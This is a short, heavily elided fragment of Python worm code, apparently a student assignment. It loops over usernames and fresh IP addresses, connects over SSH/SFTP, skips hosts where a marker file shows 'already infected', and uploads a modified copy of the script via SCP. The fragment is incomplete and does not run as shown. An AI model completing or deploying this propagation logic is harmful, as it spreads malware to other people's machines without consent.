        ...
        for user in usernames:
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    filename = "modified_1805027_3.py"

                    sftp = ssh.open_sftp()

                    try:
                        sftp.stat(filename)  # Try to retrieve file information
                        print(f"The target machine is already infected")
                        continue
                    ...
                    with open("modified_1805027_3.py", "w") as f:
                        f.writelines(lines)

                    scpcon.put("modified_1805027_3.py")
                    os.remove("modified_1805027_3.py")               
